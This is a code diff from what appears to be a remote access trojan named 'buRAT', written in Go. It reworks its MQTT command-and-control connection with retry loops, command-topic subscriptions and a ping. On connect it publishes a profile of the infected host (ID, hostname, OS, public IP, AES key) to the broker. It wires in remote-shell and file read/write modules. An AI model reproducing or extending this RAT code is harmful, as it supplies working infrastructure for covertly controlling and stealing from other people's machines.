@@ -53,7 +53,9 @@ type buRAT struct {
   status          string
   _internals       _internals
   _bushido         _bushido
+  _cmdTopics      map[string]func (client mqtt.Client, msg mqtt.Message)
   _topics         map[string]string
+  _isConnecting   bool
   _mqttOptions    mqtt.ClientOptions
 }
 
@@ -72,6 +74,8 @@ type BuRAT interface {
   Publish(id string, topic string, qos byte, retain bool, payload []byte)
   AddTopics()
   Connect()
+  Connecting() bool
+  Ping()
 }
 
 func NewBuRAT() *buRAT {
@@ -79,10 +83,10 @@ func NewBuRAT() *buRAT {
     id: id(),
     host: host(),
     os: os(),
-    ip: ip(),
+    ip: "unknown",
     status: "offline",
     _internals: _internals {
-      //Mqtt:           test(),
+      Mqtt:           mqtt.NewClient(mqtt.NewClientOptions()),
       Serialization:  internals.NewSerialization(),
       RSA:            internals.NewRSA(),
       AES:            internals.NewAES(),
@@ -92,6 +96,9 @@ func NewBuRAT() *buRAT {
       RemoteShell:    bushido.NewBuRemoteShell(),
       FileRW:         bushido.NewBuFileRW(),
     },
+    _cmdTopics: make(map[string]func (client mqtt.Client, msg mqtt.Message)),
+    _topics: make(map[string]string),
+    _isConnecting: false,
   }
   return b
 }
@@ -109,7 +116,7 @@ func (b *buRAT) Profile() string {
     Id: b.id,
     Host: b.host,
     Os: b.os,
-    Ip: b.ip,
+    Ip: ip(),
     Status: b.status,
     Aes: _aes {
       Key: b._internals.AES.Key(),
@@ -135,7 +142,7 @@ func (b *buRAT) Decryse(data []byte, packet interface{}) {
 
 func (b *buRAT) AddTopicCallback(topic string, block func (client mqtt.Client, msg mqtt.Message)) {
   topic = b._topics[topic]
-  b._internals.Mqtt.Subscribe(topic, 2, block)
+  b._cmdTopics[topic] = block
 }
 
 func (b *buRAT) Publish(id string, topic string, qos byte, retain bool, payload []byte) {
@@ -156,11 +163,17 @@ func (b *buRAT) AddTopics(topics map[string]string) {
 }
 
 func (b *buRAT) Connect() {
-  if token := b._internals.Mqtt.Connect(); token.Wait() && token.Error() != nil {
-		fmt.Println(token.Error())
-    time.Sleep(11000 * time.Millisecond)
-    b.Connect()
-	}
+  b.status = "offline"
+  b._isConnecting = true
+  go b.connect()
+}
+
+func (b *buRAT) Connecting() bool {
+  return b._isConnecting
+}
+
+func (b *buRAT) Ping() {
+  b._internals.Mqtt.Publish(b._topics["nil"], 2, false, nil)
 }
 
 func (b *buRAT) digestTopic(topic string) string {
@@ -195,21 +208,44 @@ func os() string {
 }
 
 func ip() string {
-  resp, _ := http.Get("http://whatismyip.akamai.com")
+  resp, err := http.Get("http://whatismyip.akamai.com")
+  if err != nil { panic(err) }
   defer resp.Body.Close()
-  body, _ := ioutil.ReadAll(resp.Body)
-  return string(body)
+  ip, err := ioutil.ReadAll(resp.Body)
+  if err != nil { panic(err) }
+  return string(ip)
 }
 
-func (b *buRAT) MqttConfig(server string,) {
+func (b *buRAT) initMqtt() {
   opts := mqtt.NewClientOptions()
-  opts.AddBroker(server)
+  opts.AddBroker("tcp://localhost:1883")
   opts.SetOnConnectHandler(func (client mqtt.Client) {
     b.status = "online"
     client.Publish(b._topics["bushi"], 2, true, b.Profile())
   })
   opts.SetWill(b._topics["bushi"], b.Profile(), 2, true)
   b._internals.Mqtt = mqtt.NewClient(opts)
+}
+
+func (b *buRAT) connect() {
+  defer func() {
+    if r := recover(); r != nil {
+        fmt.Println(r)
+        time.Sleep(11 * time.Second)
+        b.Connect()
+      }
+  }()
+  b.initMqtt()
+  if token := b._internals.Mqtt.Connect(); token.Wait() && token.Error() != nil {
+		fmt.Println(token.Error())
+    time.Sleep(11 * time.Second)
+    b.Connect()
+	} else {
+    b._isConnecting = false
+    for k, v := range b._cmdTopics {
+      b._internals.Mqtt.Subscribe(k, 2, v)
+    }
+  }
 }
 
 func randomHex(n int) (string, error) {
